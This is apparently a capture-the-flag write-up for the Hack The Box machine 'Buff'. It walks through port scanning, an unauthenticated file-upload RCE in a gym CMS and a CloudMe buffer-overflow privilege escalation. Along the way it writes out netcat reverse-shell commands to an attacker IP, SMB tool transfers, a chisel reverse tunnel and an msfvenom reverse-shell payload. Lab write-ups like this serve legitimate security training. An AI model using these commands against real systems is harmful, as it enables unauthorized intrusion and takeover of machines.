# Buff [HTB](https://app.hackthebox.com/machines/263)
![buff-01](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Buff/img/buff-01.png)


## Recon 

After adding the target to my `/etc/hosts` file I start scanning for open ports:

```bash
nmap -p- --min-rate 10000 buff.htb
```

![ports-02](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Buff/img/ports-02.png)


Let's run a version detection scan againts this port:

```bash
nmap -p 8080 -sCV buff.htb -oN nmap.result
```

![nmap-res-03](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Buff/img/nmap-res-03.png)


We have the following:

+ An Apache/2.4.43 server on port 8080.


The nmap probing scripts have identified that the Apache server might have the `CONNECT` HTTP method enabled. This in effect allows the web server to act as a proxy server and make request to other target systems. I tried searching online for possible exploitaion strategies for this method, but I didn't find anything super clear, more theoretical stuff.


Based on the namp probing scripts we can also conclude that the Apache is powered by PHP/7.4.6, and that the target is probably running a Windows OS with an x64-bit architecture. 


### Apache port 8080


If we browse towards `http://buff.htb:8080/` we get the following:

![site-04](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Buff/img/site-04.png)


The site seems to be offering gym services, there are four link at the top strip and a sign in form. Each of the four links leads to a different php script in the website's root directory. All of the scripts return read-only informational content, no place to input stuff as users. 


If click the `Contact` button though, we will get the following text:

![cms-05](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Buff/img/cms-05.png)


At first I thought this was placed here by the creator of this box as some sort of troll, I didn't think this is an actual CMS. But I searched for this string on Google and I found an Unauthenticated Remote Code Execution exploit [here](https://www.exploit-db.com/exploits/48506). Wow..


In short, the `upload.php` doesn't check for a proper user session, which allows unauthiticated users to upload files. By reveiwing the source of `upload.php`, methods were identified for bypassing the MIME type checks, the file extensions checks, and the content-type checks. 


I tried to find a way to exploit this manaully, but the file upload requiers a dictionary with specific strucutre and objects for it to be accepted by the server. I decided to use the python exploit script instead of finding a way to pull this off with `curl` from the command-line.


After downloading the exploit I run and get a shell:


![shell-06](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Buff/img/shell-06.png)


But I didn't like this shell, I wasn't able to perform simple tasks like changing directories. Instead, I decided to transfer a copy of `nc64.exe` over to the target using an SMB server. 


First, I grab a copy of `nc64.exe` to my working directory and start the SMB server on my Kali with:

```bash
impacket-smbserver -smb2support -debug buff .
```

Then, I connect to the SMB server from the target and copy the file over:

```cmd
net use \\10.10.14.54\buff
copy \\10.10.14.54\buff\nc64.exe nc.exe
```

![copy-07](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Buff/img/copy-07.png)


Now I start my local listener on my Kali with:

```bash
rlwrap nc -lnvp 9009
```

And coonect from the target using:

```cmd
nc.exe -e cmd.exe 10.10.14.54 9009
```

Which gives me a shell:


![nice-shell-08](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Buff/img/nice-shell-08.png)


## Privilege Escalation


After landing on the machine I start hunting down quick wins. I list any permissions we have using `whoami /priv` but we don't have any interesting permissions. I look for any stored credentials using `cmdkey /list` but there are none. I also check for the presence of `Always Installed Elevated` vulnerability but I dont find any. 


So I shift gears and start looking around the filesystem, I start with `shaun`'s home directory at `C:\Users\shaun`. Inside the `Downloads` folder I see something interesting:

![downloads-09](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Buff/img/downloads-09.png)


I search for this executable online and I find a Buffer-Overflow exploit for it on [ExploitDB](https://www.exploit-db.com/exploits/48389). From what I understand `CloudMe Sync` is a synchronization application which syncs your local storage with the cloud storage, and it is listening on port 8888.


If we list the running processes on the target system with `netstat -ano` we can see the port is open:

![port-10](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Buff/img/port-10.png)


The service must run as adminstrator, otherwise the exploit won't help us escalate privileges. I tried to list the running processes on the system in order to make sure this service is actually running as the administrator, but I was deinded access. Even though I wasn't able to make sure the service is running as the admin, I decided to bet on it. 


To try and exploit this, we first need to tunnel the service to our attack machine, I decided to use [chisel](https://github.com/jpillora/chisel).


I download an x64-bit executable chisel client for Windows using [this link](https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_windows_amd64.gz), I extract it with `gunzip -d <archive>`.


Then, I tried to transfer the file using a python web server and downloading it from the target using an `certutil` but I was denied access. I also tried other methods but they all failed. 


So I deicded to try the SMB method again, but when I connect to my share from the netcat shell there are issues establishing the connection. So I decided to use the previous shell we had, which did mange to get files via SMB.


I start the SMB server on my Kali same as before:

```bash
impacket-smbserver -smb2support -debug buff .
```

I connect to the share from the target and download the files:

```cmd
net use \\10.10.14.54\buff
copy \\10.10.14.54\buff\chisel.exe C:\Users\shaun\chisel.exe
```

![copy-11](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Buff/img/copy-11.png)


And here it is in `shaun`'s home folder:

![found-12](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Buff/img/found-12.png)


Now we are ready to setup the tunnel. First, on the Kali, we need to start the server with:

```bash
chisel server -p 8001 --reverse
```

Then, from the target establish the tunnel using:

```cmd
chisel.exe client 10.10.14.54:8001 R:8001:127.0.0.1:8001
```

This will open port 8888 on our Kali, and transfer the traffic from target's localhost:8888 to it. 

![client-13](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Buff/img/client-13.png)


After connecting the client, I receive the connetion on the server:

![server-14](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Buff/img/server-14.png)


If we list the open ports on our Kali machine, we can see the cleint/server connection is established on port 8001, and the tunnel for port 8888 is open our Kali machine:

![port-14.5](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Buff/img/netstat-14.5.png)


With the tunnel established we can try the [exploit](https://www.exploit-db.com/exploits/48389). After downloading it, we need to change the payload for the buffer-overflow, as currently it starts `calc.exe`, which is not super useful.


At first I tried an x64-bit payload, which faild. But an x84 bit payload with the below syntax works:
 
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.54 LPORT=9999 -b '\x00\x0A\x0D' -f python
```

![venom-15](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Buff/img/venom-15.png)


I copy the entier output and place it in the exploit:

![exploit-16](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Buff/img/exploit-16.png)


I also change the variable names below to match the output from msfvenom:

![vars-17](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Buff/img/vars-17.png)


Now I start the local lisetner for the connection:

```bash
rlwrap nc -lnvp 9999
```

And I execute the buffer-opverflow exploit with:

```bash
python buffer-overflow.py
```

The exploit executes with no issues, and on my netcat listener I recieve a shell as the administrator:

![root-18](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Buff/img/root-18.png)
